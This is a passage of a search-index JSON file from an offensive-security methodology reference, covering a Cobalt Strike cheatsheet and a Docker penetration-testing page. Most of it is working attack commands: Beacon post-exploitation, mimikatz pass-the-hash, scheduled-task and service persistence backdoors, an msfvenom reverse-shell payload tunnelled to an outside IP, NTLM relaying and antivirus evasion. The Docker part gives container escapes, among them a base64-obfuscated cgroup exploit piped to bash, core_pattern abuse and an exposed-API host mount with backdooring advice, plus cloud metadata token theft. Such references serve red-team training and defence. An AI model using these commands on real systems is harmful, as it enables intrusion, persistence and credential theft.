profile with ./c2lint . * A result of 0 is returned if c2lint completes with no errors * A result of 1 is returned if c2lint completes with only warnings * A result of 2 is returned if c2lint completes with only errors * A result of 3 is returned if c2lint completes with both errors and warning","title":"Malleable C2"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#files","text":"# List the file on the specified directory beacon > ls <C:\\Path> # Change into the specified working directory beacon > cd [directory] # Delete a file\\folder beacon > rm [file\\folder] # File copy beacon > cp [src] [dest] # Download a file from the path on the Beacon host beacon > download [C:\\filePath] # Lists downloads in progress beacon > downloads # Cancel a download currently in progress beacon > cancel [*file*] # Upload a file from the attacker to the current Beacon host beacon > upload [/path/to/file]","title":"Files"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#powershell-and-net","text":"","title":"Powershell and .NET"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#powershell-commands","text":"# Import a Powershell .ps1 script from the control server and save it in memory in Beacon beacon > powershell-import [/path/to/script.ps1] # Setup a local TCP server bound to localhost and download the script imported from above using powershell.exe. Then the specified function and any arguments are executed and output is returned. beacon > powershell [commandlet][arguments] # Launch the given function using Unmanaged Powershell, which does not start powershell.exe. The program used is set by spawnto beacon > powerpick [commandlet] [argument] # Inject Unmanaged Powershell into a specific process and execute the specified command. This is useful for long-running Powershell jobs beacon > psinject [pid][arch] [commandlet] [arguments]","title":"Powershell commands"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#net-remote-execution","text":"Run a local .NET executable as a Beacon post-exploitation job. Require: * Binaries compiled with the \"Any CPU\" configuration. beacon > execute-assembly [/path/to/script.exe] [arguments] beacon > execute-assembly /home/audit/Rubeus.exe [*] Tasked beacon to run .NET program: Rubeus.exe [+] host called home, sent: 318507 bytes [+] received output: ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.4.2","title":".NET remote execution"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#lateral-movement","text":":warning: OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe portscan: Performs a portscan on a specific target. runas: A wrapper of runas.exe, using credentials you can run a command as another user. pth: By providing a username and a NTLM hash you can perform a Pass The Hash attack and inject a TGT on the current process. \\ :exclamation: This module needs Administrator privileges. steal_token: Steal a token from a specified process. make_token: By providing credentials you can create an impersonation token into the current process and execute commands from the context of the impersonated user. jump: Provides easy and quick way to move lateraly using winrm or psexec to spawn a new beacon session on a target. \\ :exclamation: The jump module will use the current delegation/impersonation token to authenticate on the remote target. \\ :muscle: We can combine the jump module with the make_token or pth module for a quick \"jump\" to another target on the network. remote-exec: Execute a command on a remote target using psexec, winrm or wmi. \\ :exclamation: The remote-exec module will use the current delegation/impersonation token to authenticate on the remote target. ssh/ssh-key: Authenticate using ssh with password or private key. Works for both linux and windows hosts. :warning: All the commands launch powershell.exe Beacon Remote Exploits ====================== jump [module] [target] [listener] psexec x86 Use a service to run a Service EXE artifact psexec64 x64 Use a service to run a Service EXE artifact psexec_psh x86 Use a service to run a PowerShell one-liner winrm x86 Run a PowerShell script via WinRM winrm64 x64 Run a PowerShell script via WinRM Beacon Remote Execute Methods ============================= remote-exec [module] [target] [command] Methods Description ------- ----------- psexec Remote execute via Service Control Manager winrm Remote execute via WinRM (PowerShell) wmi Remote execute via WMI (PowerShell) Opsec safe Pass-the-Hash: 1. mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:\"powershell -w hidden\" 2. steal_token PID","title":"Lateral Movement"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#assume-control-of-artifact","text":"Use link to connect to SMB Beacon Use connect to connect to TCP Beacon","title":"Assume Control of Artifact"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#vpn-pivots","text":":warning: Covert VPN doesn't work with W10, and requires Administrator access to deploy. Use socks 8080 to setup a SOCKS4a proxy server on port 8080 (or any other port you choose). This will setup a SOCKS proxy server to tunnel traffic through Beacon. Beacon's sleep time adds latency to any traffic you tunnel through it. Use sleep 0 to make Beacon check-in several times a second. # Start a SOCKS server on the given port on your teamserver, tunneling traffic through the specified Beacon. Set the teamserver/port configuration in /etc/proxychains.conf for easy usage. beacon > socks [PORT] beacon > socks [port] beacon > socks [port] [socks4] beacon > socks [port] [socks5] beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] beacon > socks [port] [socks5] [enableNoAuth|disableNoAuth] [user] [password] [enableLogging|disableLogging] # Proxy browser traffic through a specified Internet Explorer process. beacon > browserpivot [pid] [x86|x64] # Bind to the specified port on the Beacon host, and forward any incoming connections to the forwarded host and port. beacon > rportfwd [bind port] [forward host] [forward port] # spunnel : Spawn an agent and create a reverse port forward tunnel to its controller. ~= rportfwd + shspawn. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw -o /tmp/msf.bin beacon> spunnel x64 184.105.181.155 4444 C:\\Payloads\\msf.bin # spunnel_local: Spawn an agent and create a reverse port forward, tunnelled through your Cobalt Strike client, to its controller # then you can handle the connect back on your MSF multi handler beacon> spunnel_local x64 127.0.0.1 4444 C:\\Payloads\\msf.bin","title":"VPN &amp; Pivots"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#kits","text":"Cobalt Strike Community Kit - Community Kit is a central repository of extensions written by the user community to extend the capabilities of Cobalt Strike","title":"Kits"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#elevate-kit","text":"UAC Token Duplication : Fixed in Windows 10 Red Stone 5 (October 2018) beacon> runasadmin Beacon Command Elevators ======================== Exploit Description ------- ----------- ms14-058 TrackPopupMenu Win32k NULL Pointer Dereference (CVE-2014-4113) ms15-051 Windows ClientCopyImage Win32k Exploit (CVE 2015-1701) ms16-016 mrxdav.sys WebDav Local Privilege Escalation (CVE 2016-0051) svc-exe Get SYSTEM via an executable run as a service uac-schtasks Bypass UAC with schtasks.exe (via SilentCleanup) uac-token-duplication Bypass UAC with Token Duplication","title":"Elevate Kit"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#persistence-kit","text":"https://github.com/0xthirteen/MoveKit https://github.com/fireeye/SharPersist ```powershell # List persistences SharPersist -t schtaskbackdoor -m list SharPersist -t startupfolder -m list SharPersist -t schtask -m list","title":"Persistence Kit"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#add-a-persistence","text":"SharPersist -t schtaskbackdoor -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Something Cool\" -m add SharPersist -t schtaskbackdoor -n \"Something Cool\" -m remove SharPersist -t service -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Service\" -m add SharPersist -t service -n \"Some Service\" -m remove SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add SharPersist -t schtask -c \"C:\\Windows\\System32\\cmd.exe\" -a \"/c calc.exe\" -n \"Some Task\" -m add -o hourly SharPersist -t schtask -n \"Some Task\" -m remove ```","title":"Add a persistence"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#resource-kit","text":"The Resource Kit is Cobalt Strike's means to change the HTA, PowerShell, Python, VBA, and VBS script templates Cobalt Strike uses in its workflows","title":"Resource Kit"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#artifact-kit","text":"Cobalt Strike uses the Artifact Kit to generate its executables and DLLs. The Artifact Kit is a source code framework to build executables and DLLs that evade some anti-virus products. The Artifact Kit build script creates a folder with template artifacts for each Artifact Kit technique. To use a technique with Cobalt Strike, go to Cobalt Strike -> Script Manager, and load the artifact.cna script from that technique's folder. Artifact Kit (Cobalt Strike 4.0) - https://www.youtube.com/watch?v=6mC21kviwG4 : Download the artifact kit : Go to Help -> Arsenal to download Artifact Kit (requires a licensed version of Cobalt Strike) Install the dependencies : sudo apt-get install mingw-w64 Edit the Artifact code Change pipename strings Change VirtualAlloc in patch.c / patch.exe , e.g: HeapAlloc Change Import Build the Artifact Cobalt Strike -> Script Manager > Load .cna","title":"Artifact Kit"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#mimikatz-kit","text":"Download and extract the .tgz from the Arsenal (Note: The version uses the Mimikatz release version naming (i.e., 2.2.0.20210724) Load the mimikatz.cna aggressor script Use mimikatz functions as normal","title":"Mimikatz Kit"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#sleep-mask-kit","text":"The Sleep Mask Kit is the source code for the sleep mask function that is executed to obfuscate Beacon, in memory, prior to sleeping. Use the included build.sh or build.bat script to build the Sleep Mask Kit on Kali Linux or Microsoft Windows. The script builds the sleep mask object file for the three types of Beacons (default, SMB, and TCP) on both x86 and x64 architectures in the sleepmask directory. The default type supports HTTP, HTTPS, and DNS Beacons.","title":"Sleep Mask Kit"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#thread-stack-spoofer","text":"An advanced in-memory evasion technique that spoofs Thread Call Stack. This technique allows to bypass thread-based memory examination rules and better hide shellcodes while in-process memory. Thread Stack Spoofer is now enabled by default in the Artifact Kit, it is possible to disable it via the option artifactkit_stack_spoof in the config file arsenal_kit.config .","title":"Thread Stack Spoofer"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#beacon-object-files","text":"A BOF is just a block of position-independent code that receives pointers to some Beacon internal APIs Example: https://github.com/Cobalt-Strike/bof_template/blob/main/beacon.h Compile ```ps1 # To compile this with Visual Studio: cl.exe /c /GS- hello.c /Fohello.o","title":"Beacon Object Files"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#to-compile-this-with-x86-mingw","text":"i686-w64-mingw32-gcc -c hello.c -o hello.o","title":"To compile this with x86 MinGW:"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#to-compile-this-with-x64-mingw","text":"x86_64-w64-mingw32-gcc -c hello.c -o hello.o `` * Execute: inline-execute /path/to/hello.o`","title":"To compile this with x64 MinGW:"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#ntlm-relaying-via-cobalt-strike","text":"beacon> socks 1080 kali> proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://<IP_TARGET> beacon> rportfwd_local 8445 <IP_KALI> 445 beacon> upload C:\\Tools\\PortBender\\WinDivert64.sys beacon> PortBender redirect 445 8445","title":"NTLM Relaying via Cobalt Strike"},{"location":"Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/#references","text":"Red Team Ops with Cobalt Strike (1 of 9): Operations Red Team Ops with Cobalt Strike (2 of 9): Infrastructure Red Team Ops with Cobalt Strike (3 of 9): C2 Red Team Ops with Cobalt Strike (4 of 9): Weaponization Red Team Ops with Cobalt Strike (5 of 9): Initial Access Red Team Ops with Cobalt Strike (6 of 9): Post Exploitation Red Team Ops with Cobalt Strike (7 of 9): Privilege Escalation Red Team Ops with Cobalt Strike (8 of 9): Lateral Movement Red Team Ops with Cobalt Strike (9 of 9): Pivoting A Deep Dive into Cobalt Strike Malleable C2 - Joe Vest - Sep 5, 2018 Cobalt Strike. Walkthrough for Red Teamers - Neil Lines - 15 Apr 2019 TALES OF A RED TEAMER: HOW TO SETUP A C2 INFRASTRUCTURE FOR COBALT STRIKE \u2013 UB 2018 - NOV 25 2018 Cobalt Strike - DNS Beacon How to Write Malleable C2 Profiles for Cobalt Strike - January 24, 2017 NTLM Relaying via Cobalt Strike - July 29, 2021 - Rasta Mouse Cobalt Strike - User Guide Cobalt Strike 4.6 - User Guide PDF","title":"References"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/","text":"Docker Pentest Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers. Summary Tools Mounted Docker Socket Open Docker API Port Insecure Docker Registry Exploit privileged container abusing the Linux cgroup v1 Abusing CAP_SYS_ADMIN capability Abusing coredumps and core_pattern Breaking out of Docker via runC Breaking out of containers using a device file References Tools Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations powershell dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) powershell ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow ./deepce.sh --no-enumeration --exploit DOCKER --command \"whoami>/tmp/hacked\" Mounted Docker Socket Prerequisite: * Socker mounted as volume : - \"/var/run/docker.sock:/var/run/docker.sock\" Usually found in /var/run/docker.sock , for example for Portainer. curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json curl -XPOST \u2013unix-socket /var/run/docker.sock -d '{\"Image\":\"nginx\"}' -H 'Content-Type: application/json' http://localhost/containers/create curl -XPOST \u2013unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start Exploit using brompwnie/ed root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true [+] Hunt dem Socks [+] Hunting Down UNIX Domain Sockets from: /var/run/ [*] Valid Socket: /var/run/docker.sock [+] Attempting to autopwn [+] Hunting Docker Socks [+] Attempting to Autopwn: /var/run/docker.sock [*] Getting Docker client... [*] Successfully got Docker client... [+] Attempting to escape to host... [+] Attempting in TTY Mode chroot /host && clear echo 'You are now on the underlying host' chroot /host && clear echo 'You are now on the underlying host' / # chroot /host && clear / # echo 'You are now on the underlying host' You are now on the underlying host / # id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video) Open Docker API Port Prerequisite: * Docker runned with -H tcp://0.0.0.0:XXXX $ nmap -sCV 10.10.10.10 -p 2376 2376/tcp open docker Docker 19.03.5 | docker-version: | Version: 19.03.5 | MinAPIVersion: 1.12 Mount the current system inside a new \"temporary\" Ubuntu container, you will gain root access to the filesystem in /mnt . $ export DOCKER_HOST=tcp://10.10.10.10:2376 $ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0 -t ubuntu bash or $ docker -H open.docker.socket:2375 ps $ docker -H open.docker.socket:2375 exec -it mysql /bin/bash or $ curl -s \u2013insecure https://tls-opendocker.socket:2376/secrets | jq $ curl \u2013insecure -X POST -H \"Content-Type: application/json\" https://tls-opendocker.socket2376/containers/create?name=test -d '{\"Image\":\"alpine\", \"Cmd\":[\"/usr/bin/tail\", \"-f\", \"1234\", \"/dev/null\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}' From there you can backdoor the filesystem by adding an ssh key in /root/.ssh or adding a new root user in /etc/passwd . Insecure Docker Registry Docker Registry\u2019s fingerprint is Docker-Distribution-Api-Version header. Then connect to Registry API endpoint: /v2/_catalog . curl https://registry.example.com/v2/<image_name>/tags/list docker pull https://registry.example.com:443/<image_name>:<tag> # connect to the endpoint and list image blobs curl -s -k --user \"admin:admin\" https://docker.registry.local/v2/_catalog curl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/tags/list curl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/manifests/latest # download blobs curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' > out.tar.gz # automated download https://github.com/NotSoSecure/docker_fetch/ python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local Access a private registry and start a container with one of its image docker login -u admin -p admin docker.registry.local docker pull docker.registry.local/wordpress-image docker run -it docker.registry.local/wordpress-image /bin/bash Access a private registry using OAuth Token from Google curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token docker login -e <email> -u oauth2accesstoken -p \"<access token>\" https://gcr.io Exploit privileged container abusing the Linux cgroup v1 Prerequisite (at least one): * --privileged * --security-opt apparmor=unconfined --cap-add=SYS_ADMIN flags. Abusing CAP_SYS_ADMIN capability docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c 'echo \"cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK\" | base64 -d | bash -' Exploit breakdown : # On the host docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash # In the container mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x echo 1 > /tmp/cgrp/x/notify_on_release host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` echo \"$host_path/cmd\" > /tmp/cgrp/release_agent echo '#!/bin/sh' > /cmd echo \"ps aux > $host_path/output\" >> /cmd chmod a+x /cmd sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\" Abusing coredumps and core_pattern Find the mounting point using mount ps1 $ mount | head -n 1 overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work) Create an evil binary at the root of the filesystem: cp /tmp/poc /poc Set the program to be executed on the coredumps ps1 echo \"|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc\" > /proc/sys/kernel/core_pattern Generate a coredump with a faulty program: gcc -o crash crash.c && ./crash cpp int main(void) { char buf[1]; for (int i = 0; i < 100; i++) { buf[i] = 1; } return 0; } Your payload should have been executed on the host Breaking out of Docker via runC The vulnerability allows a malicious container to (with minimal user interaction) overwrite the host runc binary and thus gain root-level code execution on the host. The level of user interaction is being able to run any command ... as root within a container in either of these contexts: Creating a new container using an attacker-controlled image. Attaching (docker exec) into an existing container which the attacker had previous write access to. - Vulnerability overview by the runC team Exploit for CVE-2019-5736 : https://github.com/twistlock/RunC-CVE-2019-5736 $ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC $ docker run --rm cve-2019-5736:malicious_image_POC Breaking out of containers using a device file https://github.com/FSecureLABS/fdpasser In container, as root: ./fdpasser recv /moo /etc/shadow Outside container, as UID 1000: ./fdpasser send /proc/$(pgrep -f \"sleep 1337\")/root/moo Outside container: ls -la /etc/shadow Output: -rwsrwsrwx 1 root shadow 1209 Oct 10 2019 /etc/shadow Breaking out of Docker via kernel modules loading When privileged Linux containers attempt to load kernel modules, the modules are loaded into the host's kernel (because there is only one kernel, unlike VMs). This provides a route to an easy container escape. Exploitation: * Clone the repository : git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping * Build with make * Start a privileged docker container with docker run -it --privileged --hostname docker --mount \"type=bind,src=$PWD,dst=/root\" ubuntu * cd /root in the new container * Insert the kernel module with ./escape * Run ./execute ! Unlike other techniques, this module doesn't contain any syscalls hooks, but merely creates two new proc files; /proc/escape and /proc/output . /proc/escape only answers to write requests and simply executes anything that's passed to it via call_usermodehelper() . /proc/output just takes input and stores it in a buffer when written to, then returns that buffer when it's read from - essentially acting a like a file that both the container and the host can read/write to. The clever part is that anything we write to /proc/escape gets sandwiched into /bin/sh -c <INPUT> > /proc/output . This means that the command is run under /bin/sh and the output is redirected to /proc/output , which we can then read from within the container. Once the module is loaded, you can simply echo \"cat /etc/passwd\" > /proc/escape and then get the result via cat /proc/output . Alternatively, you can use the execute program to give yourself a makeshift shell (albeit an extraordinarily basic one). The only caveat is that we cannot be sure that the container has kmod installed (which provides insmod and rmmod ). To overcome this, after building the kernel module, we load it's byte array into a C program, which then uses the init_module() syscall to load the module into the kernel without needing insmod . If you're interested, take a look at the Makefile. References Hacking Docker Remotely - 17 March 2020 - ch0ks Understanding Docker container escapes - JULY 19, 2019 - Trail of Bits Capturing all the flags in BSidesSF CTF by pwning our infrastructure - Hackernoon Breaking out of Docker via runC \u2013 Explaining CVE-2019-5736 - Yuval Avrahami - February 21, 2019 CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host - dragonsector.pl OWASP - Docker Security CheatSheet Anatomy of a hack: Docker Registry - NotSoSecure - April 6, 2017 Linux Kernel Hacking 3.8: Privileged Container Escapes - Harvey Phillips @xcellerator Escaping privileged containers for fun - 2022-03-06 :: Jordy Zomer","title":"Docker Pentest"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#docker-pentest","text":"Docker is a set of platform as a service (PaaS) products that uses OS-level virtualization to deliver software in packages called containers.","title":"Docker Pentest"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#summary","text":"Tools Mounted Docker Socket Open Docker API Port Insecure Docker Registry Exploit privileged container abusing the Linux cgroup v1 Abusing CAP_SYS_ADMIN capability Abusing coredumps and core_pattern Breaking out of Docker via runC Breaking out of containers using a device file References","title":"Summary"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#tools","text":"Dockscan : Dockscan is security vulnerability and audit scanner for Docker installations powershell dockscan unix:///var/run/docker.sock dockscan -r html -o myreport -v tcp://example.com:5422 DeepCe : Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) powershell ./deepce.sh ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce ./deepce.sh --no-enumeration --exploit SOCK --shadow ./deepce.sh --no-enumeration --exploit DOCKER --command \"whoami>/tmp/hacked\"","title":"Tools"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#mounted-docker-socket","text":"Prerequisite: * Socker mounted as volume : - \"/var/run/docker.sock:/var/run/docker.sock\" Usually found in /var/run/docker.sock , for example for Portainer. curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json curl -XPOST \u2013unix-socket /var/run/docker.sock -d '{\"Image\":\"nginx\"}' -H 'Content-Type: application/json' http://localhost/containers/create curl -XPOST \u2013unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start Exploit using brompwnie/ed root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true [+] Hunt dem Socks [+] Hunting Down UNIX Domain Sockets from: /var/run/ [*] Valid Socket: /var/run/docker.sock [+] Attempting to autopwn [+] Hunting Docker Socks [+] Attempting to Autopwn: /var/run/docker.sock [*] Getting Docker client... [*] Successfully got Docker client... [+] Attempting to escape to host... [+] Attempting in TTY Mode chroot /host && clear echo 'You are now on the underlying host' chroot /host && clear echo 'You are now on the underlying host' / # chroot /host && clear / # echo 'You are now on the underlying host' You are now on the underlying host / # id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)","title":"Mounted Docker Socket"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#open-docker-api-port","text":"Prerequisite: * Docker runned with -H tcp://0.0.0.0:XXXX $ nmap -sCV 10.10.10.10 -p 2376 2376/tcp open docker Docker 19.03.5 | docker-version: | Version: 19.03.5 | MinAPIVersion: 1.12 Mount the current system inside a new \"temporary\" Ubuntu container, you will gain root access to the filesystem in /mnt . $ export DOCKER_HOST=tcp://10.10.10.10:2376 $ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0 -t ubuntu bash or $ docker -H open.docker.socket:2375 ps $ docker -H open.docker.socket:2375 exec -it mysql /bin/bash or $ curl -s \u2013insecure https://tls-opendocker.socket:2376/secrets | jq $ curl \u2013insecure -X POST -H \"Content-Type: application/json\" https://tls-opendocker.socket2376/containers/create?name=test -d '{\"Image\":\"alpine\", \"Cmd\":[\"/usr/bin/tail\", \"-f\", \"1234\", \"/dev/null\"], \"Binds\": [ \"/:/mnt\" ], \"Privileged\": true}' From there you can backdoor the filesystem by adding an ssh key in /root/.ssh or adding a new root user in /etc/passwd .","title":"Open Docker API Port"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#insecure-docker-registry","text":"Docker Registry\u2019s fingerprint is Docker-Distribution-Api-Version header. Then connect to Registry API endpoint: /v2/_catalog . curl https://registry.example.com/v2/<image_name>/tags/list docker pull https://registry.example.com:443/<image_name>:<tag> # connect to the endpoint and list image blobs curl -s -k --user \"admin:admin\" https://docker.registry.local/v2/_catalog curl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/tags/list curl -s -k --user \"admin:admin\" https://docker.registry.local/v2/wordpress-image/manifests/latest # download blobs curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' > out.tar.gz # automated download https://github.com/NotSoSecure/docker_fetch/ python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local Access a private registry and start a container with one of its image docker login -u admin -p admin docker.registry.local docker pull docker.registry.local/wordpress-image docker run -it docker.registry.local/wordpress-image /bin/bash Access a private registry using OAuth Token from Google curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token docker login -e <email> -u oauth2accesstoken -p \"<access token>\" https://gcr.io","title":"Insecure Docker Registry"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#exploit-privileged-container-abusing-the-linux-cgroup-v1","text":"Prerequisite (at least one): * --privileged * --security-opt apparmor=unconfined --cap-add=SYS_ADMIN flags.","title":"Exploit privileged container abusing the Linux cgroup v1"},{"location":"Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/#abusing-cap_sys_admin-capability","text":"docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c 'echo 